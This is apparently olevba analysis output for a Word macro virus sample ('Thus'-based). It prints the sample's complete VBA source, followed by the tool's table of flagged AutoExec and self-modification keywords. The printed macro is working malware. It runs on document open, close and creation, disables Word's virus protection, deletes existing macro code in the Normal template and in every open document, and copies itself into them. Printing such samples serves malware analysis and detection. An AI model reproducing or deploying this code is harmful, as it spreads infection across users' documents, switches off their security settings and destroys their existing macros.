olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-b26801332567775a19ac63250f352bc4f947d5ec
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-b26801332567775a19ac63250f352bc4f947d5ec - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'CNG Safe
Private Sub Document_Open()
    Call Protect_CNG
End Sub

Private Sub Protect_CNG()
    On Error Resume Next
    
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents. _
    Item(1).CodeModule.Lines(1, 1) <> "'CNG Safe" Then
        NormalTemplate.VBProject.VBComponents. _
        Item(1).CodeModule.DeleteLines 1, _
        NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
    End If
    
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    
    If NormalTemplate.Saved = False Then NormalTemplate.Save
        Dim k As Integer
        For k = 1 To Application.Documents.Count
            If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'CNG Safe" Then
                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
            End If
            
            If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
                Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
            End If
        Next k
End Sub
Private Sub Document_Close()
    Call Protect_CNG
End Sub
Private Sub Document_New()
    Call Protect_CNG
End Sub



























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

